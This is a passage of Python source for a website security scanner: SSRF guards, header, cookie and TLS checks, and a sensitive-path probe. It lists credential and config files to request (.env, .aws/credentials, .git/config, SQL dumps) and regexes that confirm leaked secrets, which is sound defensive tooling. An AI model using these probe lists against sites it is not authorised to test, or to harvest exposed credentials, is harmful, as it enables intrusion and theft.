    # exposure-type findings to distinguish Discovered/Observed/Potential
    # Risk/Confirmed Finding (SCORE-05, Phase 13) - most findings leave it
    # unset since severity+confidence already cover them.
    confidence: str = "Not Externally Verifiable"
    cwe: str | None = None
    verification_state: str | None = None
    # v1.8 CVSS-01: optional CVSS 3.1 vector string for standardized scoring.
    cvss_vector: str | None = None
    # v1.8 DEDUP-01: count of identical findings collapsed by deduplication.
    # Always 1 for raw findings; incremented by deduplicate_findings().
    count: int = 1


def deduplicate_findings(findings):
    """Collapse duplicate findings by (check_name, category, title, affected_url).

    Returns a new list with duplicates merged: the first occurrence wins, its count
    is incremented by the number of duplicates, and the highest severity among all
    duplicates is kept (no silent downgrade). CVSS vectors are preserved from the
    first occurrence. Deterministic: same input → same output.

    This is DEDUP-01 + DEDUP-04 from Phase 32.
    """
    import hashlib
    from collections import OrderedDict

    _SEVERITY_RANK = {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1, "pass": 0}

    def _dedup_key(f):
        """Hash key for dedup: (check_name, category, title)."""
        parts = "|".join([
            (f.check_name or "").lower().strip(),
            (f.category or "").lower().strip(),
            (f.title or "").lower().strip(),
        ])
        return hashlib.sha256(parts.encode()).hexdigest()

    seen = OrderedDict()
    for f in findings:
        key = _dedup_key(f)
        if key in seen:
            existing = seen[key]
            existing.count += 1
            existing_rank = _SEVERITY_RANK.get(existing.severity, 0)
            new_rank = _SEVERITY_RANK.get(f.severity, 0)
            if new_rank > existing_rank:
                existing.severity = f.severity
                if f.cvss_vector:
                    existing.cvss_vector = f.cvss_vector
        else:
            seen[key] = f
    return list(seen.values())


SENSITIVE_PATHS = [
    ".env", ".env.local", ".env.production", ".git/config", ".git/HEAD",
    "wp-config.php.bak", "config.json", ".aws/credentials", ".DS_Store",
    "package.json.bak", "backup.zip", "db.sql", "docker-compose.yml",
    "_next/static/chunks/webpack.js", "api/health",
]

# ---------------------------------------------------------------------------
# check_sensitive_paths() data model.
#
# Each probed path belongs to one of these categories, purely for grouping
# in the report - detection logic below is the same for every category.
# "source_config" = source/VCS/app config leakage, "backup" = backup/dump
# files, "cloud_config" = cloud provider credential files, "app_discovery" =
# informational endpoints that are never themselves a vulnerability.
SENSITIVE_PATH_GROUPS = [
    ("source_config", "Source & Configuration Exposure", [
        ".env", ".env.local", ".env.production", ".git/config", ".git/HEAD",
        ".svn/entries", "config.json", "settings.json", "docker-compose.yml",
        ".DS_Store",
    ]),
    ("backup", "Backup Exposure", [
        "wp-config.php.bak", "config.php.bak", "package.json.bak",
        "backup.zip", "backup.tar.gz", "db.sql", "database.sql", "dump.sql",
    ]),
    ("cloud_config", "Cloud Credential Exposure", [
        ".aws/credentials",
    ]),
    ("app_discovery", "Application Discovery", [
        "_next/static/chunks/webpack.js", "api/health",
    ]),
]

# Content-signature checks used to decide whether a 200 response actually
# contains the sensitive artifact it claims to be, rather than trusting the
# status code alone (see check_sensitive_paths' docstring). Each entry is a
# (path-suffix-match-fn, signature-regex, human label) tuple; the regex is
# checked against the response body (first SIGNATURE_SCAN_BYTES only - never
# the full body, and never stored past this function).
SIGNATURE_SCAN_BYTES = 8000
PATH_SIGNATURES = {
    ".env": (re.compile(r"^[A-Z][A-Z0-9_]{2,}\s*=", re.M), "environment-variable syntax (KEY=value)"),
    ".env.local": (re.compile(r"^[A-Z][A-Z0-9_]{2,}\s*=", re.M), "environment-variable syntax (KEY=value)"),
    ".env.production": (re.compile(r"^[A-Z][A-Z0-9_]{2,}\s*=", re.M), "environment-variable syntax (KEY=value)"),
    ".git/config": (re.compile(r"\[core\]|repositoryformatversion", re.I), "Git configuration structure"),
    ".git/HEAD": (re.compile(r"^ref:\s*refs/", re.I), "Git HEAD reference"),
    ".svn/entries": (re.compile(r"svn|dir\b", re.I), "Subversion entries format"),
    "config.json": (re.compile(r'"(db|database|password|secret|api[_-]?key)"', re.I), "sensitive configuration keys"),
    "settings.json": (re.compile(r'"(db|database|password|secret|api[_-]?key)"', re.I), "sensitive configuration keys"),
    "docker-compose.yml": (re.compile(r"^\s*services:", re.M | re.I), "docker-compose service definitions"),
    "wp-config.php.bak": (re.compile(r"DB_PASSWORD|DB_NAME|<\?php", re.I), "WordPress database credentials"),
    "config.php.bak": (re.compile(r"<\?php|password", re.I), "PHP configuration source"),
    "package.json.bak": (re.compile(r'"name"\s*:\s*".*"\s*,.*"version"', re.S), "package.json structure"),
    "db.sql": (re.compile(r"-- MySQL dump|CREATE TABLE|INSERT INTO", re.I), "SQL dump signature"),
    "database.sql": (re.compile(r"-- MySQL dump|CREATE TABLE|INSERT INTO", re.I), "SQL dump signature"),
    "dump.sql": (re.compile(r"-- MySQL dump|CREATE TABLE|INSERT INTO", re.I), "SQL dump signature"),
    ".aws/credentials": (re.compile(r"\[default\]|aws_access_key_id", re.I), "AWS credentials file format"),
}
# Binary magic-byte signatures for archive-style backups where a text regex
# doesn't apply - checked against the raw response bytes instead.
BINARY_PATH_SIGNATURES = {
    "backup.zip": (b"PK\x03\x04", "ZIP archive header"),
    "backup.tar.gz": (b"\x1f\x8b", "gzip archive header"),
}

SECURITY_HEADERS = [
    ("strict-transport-security", "Strict-Transport-Security", "Forces HTTPS on future visits.", "high"),
    ("content-security-policy", "Content-Security-Policy", "Restricts what scripts/styles/frames can load.", "high"),
    ("x-frame-options", "X-Frame-Options", "Blocks clickjacking via iframes (or frame-ancestors in CSP).", "medium"),
    ("x-content-type-options", "X-Content-Type-Options", "Stops MIME-sniffing attacks.", "low"),
    ("referrer-policy", "Referrer-Policy", "Controls what leaks via the Referer header.", "low"),
    ("permissions-policy", "Permissions-Policy", "Restricts browser features (camera, mic, geolocation).", "low"),
    ("cross-origin-opener-policy", "Cross-Origin-Opener-Policy", "Isolates your window from cross-origin popups.", "low"),
    ("cross-origin-resource-policy", "Cross-Origin-Resource-Policy", "Restricts cross-origin resource loading.", "low"),
]

SQL_ERROR_SIGNATURES = [
    r"you have an error in your sql syntax", r"warning: mysql", r"unclosed quotation mark",
    r"quoted string not properly terminated", r"pg::syntaxerror", r"sqlstate\[",
    r"sqlite3\.operationalerror", r"ora-\d{5}", r"prisma.*query.*failed",
    r"invalid input syntax for type", r"npgsql\.", r"sequelizedatabaseerror",
    # Phase 17 (DEPTH-02) additions - matched against response text lowercased,
    # so keep every pattern lowercase-safe.
    r"system\.data\.sqlclient\.sqlexception", r"mysql_fetch_array\(\)",
]

# Hard ceiling on probe requests check_xss_sqli may spend per discovered
# parameter (Phase 17 / DEPTH-02 budget guard). Worst case today:
# len(REFLECTED_XSS_VARIANTS) XSS probes + 1 error probe + 2 boolean-blind
# requests = 4 + 1 + 2 = 7. A regression test locks that arithmetic against
# this constant, so adding variants without revisiting the cap fails CI.
MAX_PROBE_REQUESTS_PER_URL = 12

REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "continue", "dest", "callbackUrl", "redirect_uri"]
AUTH_LIKE_PATH_HINTS = ["login", "signin", "signup", "logout", "signout", "auth", "sso"]
DIR_LISTING_PATHS = ["images/", "img/", "assets/", "uploads/", "static/", "backup/", "backups/", "files/", "media/"]

# Minimal known-vulnerable-below table for libraries that sometimes ship as
# named, versioned CDN/script URLs even in bundled frontends.
VULN_JS_LIBS = {
    "jquery": (lambda v: v < (3, 5, 0), "jQuery < 3.5.0 has known XSS issues (CVE-2020-11022/11023)."),
    "lodash": (lambda v: v < (4, 17, 21), "lodash < 4.17.21 has a prototype-pollution CVE (CVE-2021-23337)."),
    "moment": (lambda v: v < (2, 29, 4), "moment.js < 2.29.4 has a ReDoS CVE (CVE-2022-31129)."),
    "bootstrap": (lambda v: v < (4, 3, 1), "Bootstrap < 4.3.1 has known XSS issues in tooltip/popover data attrs."),
}


class _SSRFSafeSession(requests.Session):
    """A `requests.Session` that re-validates every redirect hop against
    `is_ssrf_safe_hostname()`, not just the original submission-time
    target.

    Why here and not at the 33 individual `session.get()`/`session.post()`
    call sites in this module: `_mk_session()` is the single place every
    check function's session is constructed, so installing the guard here
    covers all of them - including any check written the normal way in the
    future - without a 33-call-site change and without a second place this
    logic could drift out of sync.

    IMPLEMENTATION NOTE - why this overrides `get_redirect_target()` and not
    `resolve_redirects()`: 08-RESEARCH.md's Assumption A3 proposed overriding
    `resolve_redirects()` (delegate to `super().resolve_redirects()`, inspect
    each yielded response, `return` early on an unsafe one). That was built
    and proven WRONG end to end against a real local HTTP server before this
    version was written: `requests.Session.resolve_redirects()` is a
    generator whose loop body calls `self.send(req, ...)` - which performs
    the actual network connection - BEFORE it yields the resulting response.
    Wrapping the generator and inspecting what it yields therefore inspects
    each hop AFTER it has already been fetched; the private/loopback/
    metadata target had already been connected to by the time the override
    could see it and say no. A live-server proof (`tests/test_ssrf_guard.py`)
    caught this: the "blocked" target's request log was NOT empty.

    `get_redirect_target(resp)` is the method `resolve_redirects()` calls,
    on every iteration, to decide what URL (if any) to follow next -
    strictly BEFORE that URL is ever sent. Overriding it here means: resolve
    the `Location` header to an absolute URL against the response it came
    from (so a relative redirect like `/next` is checked against the host
    that produced it, not treated as hostless), extract that URL's hostname,
    and pass it to the existing, unmodified `is_ssrf_safe_hostname()` - the
    exact same predicate `scan_routes._unsafe_target_error` uses at
    submission time, so there is only ever one definition of "unsafe" in
    this codebase, never a second one drifting independently in here. An
    unresolvable/empty hostname is treated as unsafe too, matching
    `is_ssrf_safe_hostname`'s own fail-closed convention. When unsafe, this
    returns `None` - exactly what the parent method returns for "there is no
    further redirect to follow" - which is why no other method needs
    touching: `resolve_redirects()`'s own loop (cookie jar, auth-header
    stripping, method-downgrade semantics across hops - all still handled by
    `requests` itself, not reimplemented here) simply stops on its own,
    never calling `self.send()` for that hop at all. Nothing is fetched,
    nothing is yielded for it, and no exception is raised - the caller keeps
    the last response it already has (often the redirect response itself),
    matching the degrade-cleanly convention every `check_*` function in this
    module follows.

    This does NOT close DNS rebinding - a hostname that resolves safe here
    and differently at TCP-connect time is still unguarded, exactly as
    `is_ssrf_safe_hostname`'s own docstring already discloses. Closing that
    would need a custom transport/adapter that connects to the exact IP
    verified here; it is an accepted residual gap for this milestone (see
    REQUIREMENTS.md's Out of Scope table), not something this class claims
    to solve.
    """

    def get_redirect_target(self, resp):
        location = super().get_redirect_target(resp)
        if location is None:
            return None
        absolute_url = urljoin(resp.url, location)
        hostname = urlparse(absolute_url).hostname
        if not hostname or not is_ssrf_safe_hostname(hostname):
            return None
        return location


class _SSRFBlocked(requests.exceptions.ConnectionError):
    """Raised at connect time when a socket resolves to an unsafe IP. A
    subclass of ConnectionError so it rides the same `except
    requests.RequestException` path every check already wraps its network
    calls in - one blocked hop degrades that check cleanly, exactly like an
    unreachable host, rather than crashing the scan."""


def _assert_peer_ip_safe(sock):
    """Validate the IP a socket actually connected to. This is the
    TOCTOU-free half of the SSRF defense: `is_ssrf_safe_hostname` resolves
    DNS at submission time, but a rebinding attacker can serve a public IP
    then and an internal one at connect time. Here we read the real peer
    address off the live socket - whatever DNS returned this instant - and
    reject it before a single request byte is sent."""
    try:
        peer_ip = sock.getpeername()[0]
        ip = ipaddress.ip_address(peer_ip)
    except (OSError, ValueError):
        # Can't determine the peer - fail closed, same convention as
        # is_ssrf_safe_hostname's unresolvable branch.
        sock.close()
        raise _SSRFBlocked("could not verify the connected peer address") from None
    if is_unsafe_ip(ip):
        sock.close()
        raise _SSRFBlocked(f"connection resolved to a blocked address ({peer_ip})") from None


# Pinned connection classes: urllib3 calls _new_conn() to open the raw TCP
# socket, BEFORE any TLS handshake or request bytes. Validating the peer
# there covers http and https alike and runs strictly before anything is
# sent to the host.
class _PinnedHTTPConnection(_urllib3_connection.HTTPConnection):
    def _new_conn(self):
        sock = super()._new_conn()
        _assert_peer_ip_safe(sock)
        return sock


class _PinnedHTTPSConnection(_urllib3_connection.HTTPSConnection):
    def _new_conn(self):
        sock = super()._new_conn()
        _assert_peer_ip_safe(sock)
        return sock


class _PinnedHTTPConnectionPool(_urllib3_pool.HTTPConnectionPool):
    ConnectionCls = _PinnedHTTPConnection


class _PinnedHTTPSConnectionPool(_urllib3_pool.HTTPSConnectionPool):
    ConnectionCls = _PinnedHTTPSConnection


class _SSRFPinnedAdapter(requests.adapters.HTTPAdapter):
    """Installs the pinned connection pools so every socket this session
    opens is peer-IP-validated. Pairs with _SSRFSafeSession's redirect-hop
    check: redirects are validated before being followed, and the
    connection each hop actually makes is validated at the socket."""

    def init_poolmanager(self, *args, **kwargs):
        super().init_poolmanager(*args, **kwargs)
        self.poolmanager.pool_classes_by_scheme = {
            "http": _PinnedHTTPConnectionPool,
            "https": _PinnedHTTPSConnectionPool,
        }


# Connect-time peer-IP pinning is ON by default - this module is the
# detection engine and must be safe when imported and run directly in
# production, with no app/config wiring required. It is gated so the test
# suite can turn it OFF: almost every check-level test runs the real check
# against a 127.0.0.1 fixture server, and pinning (correctly) refuses
# loopback, which would block those legitimate test connections. This
# mirrors RATELIMIT_ENABLED, which tests/conftest.py also disables globally
# while one dedicated test re-enables it. tests/conftest.py sets this False
# for the general suite; tests/test_ssrf_connect_pinning.py sets it True to
# prove the guard. checks.py stays framework-agnostic (no flask import), so
# this is a plain module flag rather than a Config value.
PIN_CONNECTIONS = True


def _mk_session():
    s = _SSRFSafeSession()
    s.headers.update({"User-Agent": UA})
    # Mount the peer-IP-pinning adapter on both schemes. Combined with
    # _SSRFSafeSession's redirect guard, this closes the DNS-rebinding gap
    # that is_ssrf_safe_hostname's submission-time check alone cannot.
    if PIN_CONNECTIONS:
        adapter = _SSRFPinnedAdapter()
        s.mount("http://", adapter)
        s.mount("https://", adapter)
    return s


def normalize_target(raw):
    raw = raw.strip()
    if not re.match(r"^https?://", raw, re.I):
        raw = "https://" + raw
    parsed = urlparse(raw)
    if not parsed.netloc:
        return None
    return f"{parsed.scheme}://{parsed.netloc}"


def registrable_domain(hostname):
    parts = hostname.split(".")
    return ".".join(parts[-2:]) if len(parts) >= 2 else hostname


def is_unsafe_ip(ip):
    """True if `ip` (an ipaddress object) is in a class a scan must never
    reach: private, loopback, link-local (incl. 169.254.169.254 cloud
    metadata), reserved, multicast, or unspecified.

    Used by the connect-time peer-IP check (_assert_peer_ip_safe). It is the
    same classification is_ssrf_safe_hostname applies, deliberately kept as a
    separate copy: is_ssrf_safe_hostname is frozen byte-for-byte by a
    CLAUDE.md rule and a source-hash test, so it cannot be refactored to call
    this helper. The boolean is duplicated on purpose - if you change the set
    of unsafe classes, change BOTH, and a test in test_ssrf_connect_pinning.py
    plus the frozen-hash test will hold you to it."""
    return (ip.is_private or ip.is_loopback or ip.is_link_local
            or ip.is_reserved or ip.is_multicast or ip.is_unspecified)


def is_ssrf_safe_hostname(hostname):
    """False if hostname resolves to any private/loopback/link-local/
    reserved/multicast/unspecified address - a first line of defense
    against a scan being pointed at the hosting network's internal
    services or the cloud metadata endpoint (169.254.169.254 is
    link-local, caught by is_link_local below). Unresolvable hostnames
    are treated as unsafe too, so the caller gets a clean rejection
    instead of a confusing downstream connection-error finding.

    This is a submission-time check only - it does not pin the resolved
    IP for the actual scan request that happens later, so a DNS-
    rebinding attacker who controls their own DNS could still resolve
    differently between this check and the real request. Closing that
    fully would need a custom requests Transport/Adapter that connects
    to the exact IP verified here; that's a larger change than this
    check and is a known residual gap, not something this function
    claims to solve."""
    try:
        infos = socket.getaddrinfo(hostname, None)
    except (socket.gaierror, UnicodeError):
        return False
    if not infos:
        return False
    for info in infos:
        ip_str = info[4][0]
        try:
            ip = ipaddress.ip_address(ip_str)
        except ValueError:
            continue
        if (ip.is_private or ip.is_loopback or ip.is_link_local
                or ip.is_reserved or ip.is_multicast or ip.is_unspecified):
            return False
    return True


# --------------------------------------------------------------------------
# Individual checks. Each returns (raw_data_for_display, [Finding, ...]).
# --------------------------------------------------------------------------

def check_headers(resp):
    rows, findings = [], []
    present = 0
    for key, label, why, sev in SECURITY_HEADERS:
        val = resp.headers.get(key)
        if val:
            present += 1
            note = ""
            if key == "content-security-policy" and "unsafe-inline" in val and "style-src" in val:
                note = "Contains 'unsafe-inline' in style-src - minor hardening opportunity."
                findings.append(Finding("Headers", "CSP allows 'unsafe-inline' styles", "low",
                                         "style-src permits inline styles, weakening CSS-injection protection.",
                                         "Use nonces or hashes for styles instead of 'unsafe-inline'.", confidence="Confirmed"))
            rows.append({"header": label, "status": "pass", "value": val[:180], "why": why, "note": note})
        else:
            rows.append({"header": label, "status": "fail", "value": None, "why": why, "note": ""})
            findings.append(Finding("Headers", f"Missing {label}", sev,
                                     f"{label} header is not set. {why}",
                                     f"Add the {label} header to your server/middleware response.", confidence="Confirmed"))
    pct = present / len(SECURITY_HEADERS)
    grade = "A" if pct >= 0.95 else "B" if pct >= 0.75 else "C" if pct >= 0.5 else "D" if pct >= 0.25 else "F"
    return {"rows": rows, "grade": grade}, findings


def check_cookies(resp):
    try:
        raw_cookies = resp.raw.headers.getlist("Set-Cookie")
    except Exception:
        raw = resp.headers.get("Set-Cookie", "")
        raw_cookies = [raw] if raw else []
    rows, findings = [], []
    for c in raw_cookies:
        name = c.split("=", 1)[0].strip()
        lower = c.lower()
        secure, httponly, samesite = "secure" in lower, "httponly" in lower, "samesite" in lower
        rows.append({"name": name, "secure": secure, "httponly": httponly, "samesite": samesite, "raw": c[:160]})
        if not secure:
            findings.append(Finding("Cookies", f"Cookie '{name}' missing Secure flag", "medium",
                                     "Cookie can be sent over plain HTTP.", "Add the Secure attribute.", confidence="Confirmed"))
        if not httponly:
            findings.append(Finding("Cookies", f"Cookie '{name}' missing HttpOnly flag", "medium",
                                     "Cookie is readable by JavaScript, raising XSS-theft impact.",
                                     "Add the HttpOnly attribute unless client JS genuinely needs it.", confidence="Confirmed"))
        if not samesite:
            findings.append(Finding("Cookies", f"Cookie '{name}' missing SameSite", "low",
                                     "Cookie has no CSRF-mitigating SameSite attribute.",
                                     "Add SameSite=Lax or Strict.", confidence="Confirmed"))
    return rows, findings


# Protocol versions considered weak/deprecated - read-only classification of
# whatever ssock.version() reports after the default-context handshake below,
# never a forced downgrade/renegotiation attempt against the server.
WEAK_TLS_VERSIONS = {"SSLv2", "SSLv3", "TLSv1", "TLSv1.1"}
# Substrings that mark a negotiated cipher-suite name as weak (export-grade,
# NULL, anonymous, RC4, DES/3DES, or MD5-MAC) - matched case-insensitively
# against ssl.SSLSocket.cipher()'s OpenSSL cipher name, e.g. "RC4-SHA".
WEAK_CIPHER_HINTS = ["RC4", "DES", "MD5", "NULL", "EXPORT", "ANON"]


def _classify_tls_cipher(cipher_name):
    if not cipher_name:
        return None
    upper = cipher_name.upper()
    return next((hint for hint in WEAK_CIPHER_HINTS if hint in upper), None)


def check_tls_cert(hostname):
    try:
        ctx = ssl.create_default_context()
        with (
            socket.create_connection((hostname, 443), timeout=REQUEST_TIMEOUT) as sock,
            ctx.wrap_socket(sock, server_hostname=hostname) as ssock,
        ):
                cert = ssock.getpeercert()
                # version()/cipher() reflect whatever the server's own default
                # negotiation picked against a standard client context - this
                # never attempts to force a weaker protocol/cipher itself, it
                # only reads back what the server was willing to offer.
                tls_version = ssock.version()
                cipher = ssock.cipher()  # (name, protocol, secret_bits) or None
        not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=UTC)
        days_left = (not_after - datetime.now(UTC)).days
        subject = dict(x[0] for x in cert.get("subject", []))
        issuer = dict(x[0] for x in cert.get("issuer", []))
        status = "pass" if days_left > 30 else ("warn" if days_left > 0 else "fail")
        cipher_name = cipher[0] if cipher else None
        data = {"status": status, "subject": subject.get("commonName", "?"),
                "issuer": issuer.get("commonName", issuer.get("organizationName", "?")),
                "not_after": cert["notAfter"], "days_left": days_left,
                "tls_version": tls_version, "cipher": cipher_name,
                "cipher_bits": cipher[2] if cipher else None}
        findings = []
        if days_left <= 30:
            sev = "high" if days_left <= 0 else "medium"
            findings.append(Finding("TLS", "Certificate expiring soon" if days_left > 0 else "Certificate expired",
                                     sev, f"{days_left} days remaining.", "Renew the TLS certificate.", confidence="Confirmed"))
        if tls_version in WEAK_TLS_VERSIONS:
            findings.append(Finding("TLS", f"Weak TLS protocol negotiated: {tls_version}", "high",
                                     f"The server's default negotiation offered {tls_version}, which has known "
                                     "protocol-level weaknesses.",
                                     "Disable SSLv2/SSLv3/TLSv1.0/TLSv1.1 server-side; require TLS 1.2+.", confidence="Confirmed"))
        weak_hint = _classify_tls_cipher(cipher_name)
        if weak_hint:
            findings.append(Finding("TLS", f"Weak cipher suite negotiated: {cipher_name}", "medium",
                                     f"The negotiated cipher suite contains a known-weak component ({weak_hint}).",
                                     "Restrict the server's cipher list to modern AEAD suites "
                                     "(e.g. ECDHE-*-GCM/CHACHA20).", confidence="Confirmed"))
        return data, findings
    except Exception as e:
        return {"status": "fail", "error": str(e)}, [
            Finding("TLS", "Could not verify TLS certificate", "high", str(e), "Investigate TLS configuration.", confidence="Not Externally Verifiable")]


def check_https_redirect(base_url, session):
    host = urlparse(base_url).netloc
    try:
        r = session.get(f"http://{host}/", timeout=REQUEST_TIMEOUT, allow_redirects=False)
        location = r.headers.get("Location", "")
        ok = r.status_code in (301, 302, 307, 308) and location.lower().startswith("https")
        data = {"status": "pass" if ok else "warn", "detail": f"HTTP {r.status_code} -> {location or '(no redirect)'}"}
        findings = [] if ok else [Finding("Transport", "Plain HTTP does not redirect to HTTPS", "high",
                                           "A visitor on http:// is not forced onto an encrypted connection.",
                                           "Add a 301/308 redirect from http:// to https:// at the edge.", confidence="Confirmed")]
        return data, findings
    except requests.RequestException as e:
        return {"status": "info", "detail": f"Could not reach plain HTTP: {e}"}, []


def _extract_title(text):
    m = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
    return re.sub(r"\s+", " ", m.group(1)).strip()[:120] if m else ""


def _fingerprint_response(r):
    """Reduces a response down to the handful of signals used for both the
    soft-404 baseline comparison and general evidence display - never keeps
    the response body itself past this call."""
    text = r.text or ""
    return {
        "status": r.status_code,
        "content_type": (r.headers.get("Content-Type") or "").split(";")[0].strip(),
        "size": len(r.content or b""),
        "title": _extract_title(text[:SIGNATURE_SCAN_BYTES]),
    }


def _looks_like_baseline(fp, baseline):
    """True if a probe's response fingerprint is close enough to the site's
    known-nonexistent-URL baseline that a 200 (or any other status) is
    almost certainly a "soft 404" - a custom not-found/SPA-shell page that
    happens to answer every path with the same content - rather than
    evidence the requested file actually exists. Uses several independent,
    individually-weak signals together (status, content-type, page title,
    response size within 15%) instead of one brittle exact match, per the
    "avoid brittle exact string matching" requirement.

    content-type + size-within-15% alone are NOT enough: two short, wholly
    unrelated pages (e.g. a real 404 page and a real, distinct redirect
    target) are often coincidentally close in both once bodies are only a
    few dozen bytes. At least one *strong* signal (identical status, or an
    identical <title>) is required in addition to reaching the score
    threshold, so a genuine soft-404/SPA-shell match still needs something
    more specific than "both pages are small and HTML"."""
    if baseline is None:
        return False
    score = 0
    strong = False
    if fp["status"] == baseline["status"]:
        score += 1
        strong = True
    if fp["content_type"] and fp["content_type"] == baseline["content_type"]:
        score += 1
    if fp["title"] and fp["title"] == baseline["title"]:
        score += 2  # identical <title> across "different" pages is a strong soft-404 tell
        strong = True
    if baseline["size"] > 0:
        diff_ratio = abs(fp["size"] - baseline["size"]) / baseline["size"]
        if diff_ratio < 0.15:
            score += 1
    return strong and score >= 2


MAX_EVIDENCE_FRAGMENT_CHARS = 200


def _content_signature_match(path, r):
    """Returns (matched: bool, label: str|None, fragment: str|None) - whether
    the response body actually contains the artifact `path` claims to be,
    not just that the server returned 200 for it. Only inspects the first
    SIGNATURE_SCAN_BYTES of the body and never retains the body itself -
    `fragment` is at most the single matched substring, capped to
    MAX_EVIDENCE_FRAGMENT_CHARS, which is the only piece of response
    content this function (or its caller) ever hands back. Binary
    signatures (archive magic bytes) have no meaningful text fragment to
    surface, so fragment is None for those - there's no secret value to
    reveal, just a structural match."""
    if path in BINARY_PATH_SIGNATURES:
        magic, label = BINARY_PATH_SIGNATURES[path]
        return (r.content or b"")[:16].startswith(magic), label, None
    sig = PATH_SIGNATURES.get(path)
    if not sig:
        return False, None, None
    pattern, label = sig
    text = (r.text or "")[:SIGNATURE_SCAN_BYTES]
    m = pattern.search(text)
    if not m:
        return False, label, None
    # Surface the whole matched line (e.g. "DB_PASSWORD=hunter2"), not just
    # the bare key= the regex anchors on - that's what makes the evidence
    # meaningful to the report's owner ("what exactly leaked"), while still
    # being a single capped line rather than the response body.
    line_start = text.rfind("\n", 0, m.start()) + 1
    line_end = text.find("\n", m.end())
    if line_end == -1:
        line_end = len(text)
    fragment = text[line_start:line_end].strip()[:MAX_EVIDENCE_FRAGMENT_CHARS]
    return True, label, fragment


# Severity/remediation text keyed by path - used only when a path is
# CONFIRMED exposed (status 200, not a soft-404, content signature matched).
# Falls back to a generic "high"/generic remediation for any path not
# listed explicitly (e.g. future additions to SENSITIVE_PATH_GROUPS).
CONFIRMED_EXPOSURE_SEVERITY = {
    ".env": "critical", ".env.local": "critical", ".env.production": "critical",
    ".aws/credentials": "critical", "db.sql": "critical", "database.sql": "critical",
    "dump.sql": "critical", "wp-config.php.bak": "critical", "config.php.bak": "critical",
    ".git/config": "high", ".git/HEAD": "high", ".svn/entries": "high",
    "backup.zip": "high", "backup.tar.gz": "high", "package.json.bak": "medium",
    "config.json": "medium", "settings.json": "medium", "docker-compose.yml": "medium",
    ".DS_Store": "low",
}
CONFIRMED_EXPOSURE_IMPACT = {
    ".env": "Environment files commonly hold database credentials, API keys, and other application secrets.",
    ".git/config": "A leaked .git directory can let an attacker reconstruct source code and commit history.",
    ".git/HEAD": "A leaked .git directory can let an attacker reconstruct source code and commit history.",
    ".aws/credentials": "AWS access keys grant direct access to cloud infrastructure and data.",
}
DEFAULT_IMPACT = "This file can expose internal configuration, credentials, or source code to anyone who requests it."
CONFIRMED_EXPOSURE_REMEDIATION = {
    ".env": "Remove the file from the public web root, prevent env files from being deployed, and rotate any exposed credentials.",
    ".env.local": "Remove the file from the public web root, prevent env files from being deployed, and rotate any exposed credentials.",
    ".env.production": "Remove the file from the public web root, prevent env files from being deployed, and rotate any exposed credentials.",
    ".git/config": "Remove Git metadata from the public web root and ensure deployment artifacts never include the .git directory.",
    ".git/HEAD": "Remove Git metadata from the public web root and ensure deployment artifacts never include the .git directory.",
    ".aws/credentials": "Remove the file immediately and rotate the exposed AWS access keys.",
    "db.sql": "Remove the database dump immediately and rotate any credentials contained within it.",
    "database.sql": "Remove the database dump immediately and rotate any credentials contained within it.",
    "dump.sql": "Remove the database dump immediately and rotate any credentials contained within it.",
    "wp-config.php.bak": "Remove backup configuration files from the public web root and store backups outside it.",
    "config.php.bak": "Remove backup configuration files from the public web root and store backups outside it.",
}
DEFAULT_REMEDIATION = "Remove this file from the public web root or block it at the edge (WAF/redirect rule)."


def check_sensitive_paths(base_url, session):
    """Probes a curated list of commonly-leaked paths (SENSITIVE_PATH_GROUPS)
    and classifies each result as PASSED / INFORMATIONAL / NEEDS_REVIEW /
    CONFIRMED, instead of trusting the HTTP status code alone:

    - A 404 is only PASSED once it's also compared against a live baseline -
      a request to a randomly-generated, definitely-nonexistent URL - so a
      site that "soft-404s" with a 200 (a custom not-found page or SPA
      shell that answers every path) doesn't get reported as exposing every
      sensitive file it was asked about. See _looks_like_baseline(). This
      baseline comparison also catches the "redirects everywhere to the
      same login/shell page" case, since a genuinely-protected sensitive
      path and the random nonexistent probe usually land on that same page.
    - A 403 is reported as NEEDS_REVIEW ("blocked"), never as evidence the
      file exists - it proves access is denied, not that the resource is
      actually there.
    - A 429 is reported as NEEDS_REVIEW ("rate limited") - the check
      cannot reliably tell whether the resource exists when the target is
      throttling it, and does not retry (no request in this function is
      ever repeated) so as to not add to the rate-limiting itself.
    - A 5xx is reported as NEEDS_REVIEW ("server error") - inconclusive,
      not evidence either way.
    - A 200 only becomes CONFIRMED exposure once the response body/bytes
      actually match a signature for that specific artifact (env-var
      syntax, Git config structure, a SQL dump header, ...) - see
      _content_signature_match(). A 200 that doesn't match any signature
      (and isn't a soft-404 match either) is reported as NEEDS_REVIEW rather
      than a confirmed vulnerability, per the "prefer 'not confirmed' over
      an unsupported claim" principle.

    Evidence stored per row is deliberately minimal - status/URL/redirect
    chain/content-type/size/timing, plus (only for a CONFIRMED text-based
    match) a single capped line of the matched content as `secret_evidence`.
    The full response body is never stored; at most SIGNATURE_SCAN_BYTES of
    it is ever held in memory, and only for the duration of this function.
    `secret_evidence["raw"]` is masked in the report UI by default and
    revealed only behind the same ownership check that already gates the
    whole report page (see scan_report.html) - it is never included in a
    Finding's title/detail (which feed ai_summary.py's third-party LLM
    call), never logged, and this function contains no print/logging calls
    of its own to accidentally leak it through.
    """
    rows, findings = [], []

    def probe(path):
        try:
            r = session.get(f"{base_url}/{path}", timeout=REQUEST_TIMEOUT, allow_redirects=True)
            return path, r, None
        except requests.RequestException as e:
            return path, None, str(e)

    # Baseline: a randomly-generated path that cannot exist, used to detect
    # "soft 404" behavior (see module docstring above and _looks_like_baseline).
    baseline = None
    try:
        probe_id = f"wvscan-nonexistent-{os.urandom(6).hex()}"
        br = session.get(f"{base_url}/{probe_id}", timeout=REQUEST_TIMEOUT, allow_redirects=True)
        baseline = _fingerprint_response(br)
    except requests.RequestException:
        pass  # baseline stays None -> soft-404 detection is simply skipped below

    all_paths = [p for _, _, paths in SENSITIVE_PATH_GROUPS for p in paths]
    group_of = {p: (gid, glabel) for gid, glabel, paths in SENSITIVE_PATH_GROUPS for p in paths}

    with ThreadPoolExecutor(max_workers=8) as pool:
        results = list(pool.map(probe, all_paths))

    for path, r, error in results:
        group_id, group_label = group_of[path]
        row = {
            "path": "/" + path, "group": group_id, "group_label": group_label,
            "evidence": {}, "secret_evidence": None,
            "classification": "", "severity": "info", "confidence": "high",
